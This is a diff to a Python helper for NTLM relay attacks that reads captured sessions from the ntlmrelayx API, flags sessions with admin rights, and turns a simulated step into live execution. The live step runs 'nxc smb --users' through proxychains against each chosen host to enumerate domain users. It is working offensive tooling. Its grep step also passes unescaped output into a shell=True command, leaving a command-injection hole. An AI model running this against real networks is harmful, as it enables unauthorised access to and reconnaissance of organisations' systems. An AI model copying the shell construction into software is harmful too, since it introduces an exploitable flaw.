@@ -3,6 +3,7 @@ import sys
 import argparse
 import requests
 from collections import defaultdict
+import subprocess
 
 # Function to fetch data from the ntlmrelayx HTTPAPI
 def fetch_data_from_api(api_url):
@@ -33,19 +34,24 @@ def filter_true_lines(file_path):
 def display_unique_counts(true_lines, cache_ips, debug=False):
     unique_systems = set()
     unique_users = set()
+    admin_systems = set()
+    admin_users = set()
 
     for entry in true_lines:
         ip = entry[1]
         domain_user = entry[2]
         unique_systems.add(ip)
         unique_users.add(domain_user)
+        if entry[3] == 'TRUE':
+            admin_systems.add(ip)
+            admin_users.add(domain_user)
 
     if debug:
         print(f"Systems: {list(unique_systems)}")  # Debugging information
         print(f"Users: {list(unique_users)}")  # Debugging information
 
-    print(f"\nNumber of unique \033[1;34msystems\033[0m: \033[1m{len(unique_systems)}\033[0m")
-    print(f"Number of unique \033[1;34musers\033[0m: \033[1m{len(unique_users)}\033[0m")
+    print(f"\nNumber of unique \033[1;34msystems\033[0m: \033[1m{len(unique_systems)}\033[0m (\033[1;33m{len(admin_systems)} with admin\033[0m)")
+    print(f"Number of unique \033[1;34musers\033[0m: \033[1m{len(unique_users)}\033[0m (\033[1;33m{len(admin_users)} with admin\033[0m)")
 
     if cache_ips:
         print(f"\033[1mCache file exists. {len(cache_ips)} unique IPs found in the cache.\033[0m")
@@ -87,11 +93,25 @@ def select_systems(available_ips):
             print("No valid IPs entered. Please try again.")
 
 # Function to handle the execution of commands
-def execute_command(ip, domain_user, command, output_file, grep=None):
-    # Placeholder for command execution, needs to be updated with actual commands
-    # The command should use subprocess to run
-    # Add logic for grep if applicable
-    print(f"\033[1m[ SIMULATION ] Running {command} on {ip} ({domain_user})...\033[0m")
+def execute_command(ip, domain_user, action_name, output_file, grep=None):
+    domain, user = domain_user.split('/')
+    command = f"proxychains4 -q nxc smb {ip} -d {domain} -u {user} -p '' --users"
+    print(f"\033[1m[ EXECUTING ] {command}\033[0m")
+
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        output = result.stdout
+
+        if grep:
+            output = subprocess.run(f"echo \"{output}\" | grep {grep}", shell=True, capture_output=True, text=True).stdout
+
+        if output_file:
+            with open(output_file, 'a') as f:
+                f.write(f"\n[OUTPUT FOR {ip} - {domain_user}]\n{output}\n")
+        else:
+            print(output)
+    except subprocess.CalledProcessError as e:
+        print(f"Command failed: {e}")
 
 # Function to display the main menu
 def display_menu(title, options, cache_actions, available_ips, back_option=True):
@@ -179,8 +199,22 @@ def handle_action_selection(category, true_lines, cache_file, cache_actions, arg
             # Select systems to target
             target_ips = select_systems(available_ips)
             if isinstance(target_ips, list):
-                # Execute command for each selected IP
-                for ip in target_ips:
+                # Execute command for the first selected IP
+                first_ip = target_ips[0]
+                for entry in true_lines:
+                    if entry[1] == first_ip:
+                        domain_user = entry[2]
+                        execute_command(first_ip, domain_user, action_name, args.output_file, args.grep)
+                        update_cache(cache_file, action_name, [first_ip])
+                        break
+                
+                # Prompt to continue with remaining systems
+                proceed = input("Do you want to continue with the remaining systems? (y/n): ").strip().lower()
+                if proceed == 'n':
+                    return
+                
+                # Execute command for the remaining selected IPs
+                for ip in target_ips[1:]:
                     for entry in true_lines:
                         if entry[1] == ip:
                             domain_user = entry[2]
@@ -189,6 +223,21 @@ def handle_action_selection(category, true_lines, cache_file, cache_actions, arg
             else:
                 # If target_ips is not a list, it's either 'all' or a control command
                 if target_ips == 'all':
+                    # Execute command for the first system
+                    first_ip = list(available_ips)[0]
+                    for entry in true_lines:
+                        if entry[1] == first_ip:
+                            domain_user = entry[2]
+                            execute_command(first_ip, domain_user, action_name, args.output_file, args.grep)
+                            update_cache(cache_file, action_name, [first_ip])
+                            break
+                    
+                    # Prompt to continue with remaining systems
+                    proceed = input("Do you want to continue with the remaining systems? (y/n): ").strip().lower()
+                    if proceed == 'n':
+                        return
+                    
+                    # Execute command for the remaining systems
                     for entry in true_lines:
                         ip = entry[1]
                         domain_user = entry[2]
